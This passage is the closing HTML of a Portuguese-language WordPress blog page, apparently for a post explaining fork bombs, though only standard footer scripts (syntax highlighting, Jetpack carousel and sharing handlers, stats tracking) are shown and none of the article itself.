				Verificação de e-mail falhou, tente novamente			</div>

			<div class="errors errors-3" style="display: none;">
				Desculpe, seu blog não pode compartilhar posts por e-mail.			</div>
		</form>
	</div>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/shCore.js?ver=2.1.364'></script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/shBrushBash.js?ver=2.1.364'></script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/shBrushPython.js?ver=2.1.364'></script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/shBrushCpp.js?ver=2.1.364'></script>
<script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "https://elias.praciano.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/styles/shCore.css?ver=2.1.364";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
		var themecssurl = "https://elias.praciano.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/styles/shThemeDefault.css?ver=2.1.364";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
	})();
	SyntaxHighlighter.config.clipboardSwf = 'https://elias.praciano.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf';
	SyntaxHighlighter.config.strings.expandSource = 'show source';
	SyntaxHighlighter.config.strings.viewSource = 'view source';
	SyntaxHighlighter.config.strings.copyToClipboard = 'copy to clipboard';
	SyntaxHighlighter.config.strings.copyToClipboardConfirmation = 'The code is in your clipboard now';
	SyntaxHighlighter.config.strings.print = 'print';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['wrap-lines'] = false;
	SyntaxHighlighter.all();
</script>
<!--[if lte IE 8]>
<link rel='stylesheet' id='jetpack-carousel-ie8fix-css'  href='https://elias.praciano.com/wp-content/plugins/jetpack/modules/carousel/jetpack-carousel-ie8fix.css?ver=20121024' type='text/css' media='all' />
<![endif]-->
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/jetpack/_inc/build/photon/photon.min.js?ver=20130122'></script>
<script type='text/javascript' src='https://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201809'></script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/jetpack/_inc/build/lazy-images/js/lazy-images.min.js?ver=5.8'></script>
<script type='text/javascript' src='https://secure.gravatar.com/js/gprofiles.js?ver=2018Febaa'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/jetpack/modules/wpgroho.js?ver=4.9.4'></script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010'></script>
<script type='text/javascript' src='https://elias.praciano.com/wp-includes/js/comment-reply.min.js?ver=4.9.4'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var screenReaderText = {"expand":"<span class=\"screen-reader-text\">expandir submenu<\/span>","collapse":"<span class=\"screen-reader-text\">fechar submenu<\/span>"};
/* ]]> */
</script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/themes/twentyfifteen/js/functions.js?ver=20150330'></script>
<script type='text/javascript' src='https://elias.praciano.com/wp-includes/js/wp-embed.min.js?ver=4.9.4'></script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/jetpack/_inc/build/spin.min.js?ver=1.3'></script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/jetpack/_inc/build/jquery.spin.min.js?ver=1.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var jetpackCarouselStrings = {"widths":[370,700,1000,1200,1400,2000],"is_logged_in":"","lang":"pt","ajaxurl":"https:\/\/elias.praciano.com\/wp-admin\/admin-ajax.php","nonce":"66dd10cc87","display_exif":"1","display_geo":"1","single_image_gallery":"1","single_image_gallery_media_file":"","background_color":"white","comment":"Coment\u00e1rio","post_comment":"Publicar coment\u00e1rio","write_comment":"Escreva um Coment\u00e1rio","loading_comments":"Carregando coment\u00e1rios...","download_original":"Visualizar tamanho original <span class=\"photo-size\">{0}<span class=\"photo-size-times\">\u00d7<\/span>{1}<\/span>","no_comment_text":"Certifique-se de enviar algum texto com o seu coment\u00e1rio.","no_comment_email":"Informe um endere\u00e7o de e-mail para comentar.","no_comment_author":"Forne\u00e7a seu nome para comentar.","comment_post_error":"Desculpe, mas ocorreu um erro ao postar seu coment\u00e1rio. Tente novamente mais tarde.","comment_approved":"Seu coment\u00e1rio foi aprovado.","comment_unapproved":"Seu coment\u00e1rio est\u00e1 aguardando modera\u00e7\u00e3o.","camera":"C\u00e2mera","aperture":"Abertura","shutter_speed":"Velocidade do Obturador","focal_length":"Comprimento Focal","copyright":"Direito autoral","comment_registration":"0","require_name_email":"1","login_url":"https:\/\/elias.praciano.com\/wp-login.php?redirect_to=https%3A%2F%2Felias.praciano.com%2F2014%2F11%2Fo-que-e-uma-fork-bomb%2F","blog_id":"1","meta_data":["camera","aperture","shutter_speed","focal_length","copyright"],"local_comments_commenting_as":"<fieldset><label for=\"email\">E-mail (obrigat\u00f3rio)<\/label> <input type=\"text\" name=\"email\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-email-field\" \/><\/fieldset><fieldset><label for=\"author\">Nome (obrigat\u00f3rio)<\/label> <input type=\"text\" name=\"author\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-author-field\" \/><\/fieldset><fieldset><label for=\"url\">Site<\/label> <input type=\"text\" name=\"url\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-url-field\" \/><\/fieldset>"};
/* ]]> */
</script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/jetpack/_inc/build/carousel/jetpack-carousel.min.js?ver=20170209'></script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/jetpack/_inc/build/postmessage.min.js?ver=5.8'></script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/jetpack/_inc/build/jquery.jetpack-resize.min.js?ver=5.8'></script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/jetpack/_inc/build/likes/queuehandler.min.js?ver=5.8'></script>
<script async="async" type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/akismet/_inc/form.js?ver=4.0.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/jetpack/_inc/build/sharedaddy/sharing.min.js?ver=5.8'></script>
<script type='text/javascript'>
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-facebook', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-twitter', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-google-plus-1', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomgoogle-plus-1', 'menubar=1,resizable=1,width=480,height=550' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-telegram', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtelegram', 'menubar=1,resizable=1,width=450,height=450' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-linkedin', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-pocket', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcompocket', 'menubar=1,resizable=1,width=450,height=450' );
				return false;
			});
</script>
	<iframe src='https://widgets.wp.com/likes/master.html?ver=20171126#ver=20171126&amp;lang=pt-br' scrolling='no' id='likes-master' name='likes-master' style='display:none;'></iframe>
	<div id='likes-other-gravatars'><div class="likes-text"><span>%d</span> blogueiros gostam disto:</div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
	<script type='text/javascript' src='https://stats.wp.com/e-201809.js' async='async' defer='defer'></script>
<script type='text/javascript'>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:5.8',blog:'57584195',post:'1875',tz:'-3',srv:'elias.praciano.com'} ]);
	_stq.push([ 'clickTrackerInit', '57584195', '1875' ]);
</script>

</body>
</html>
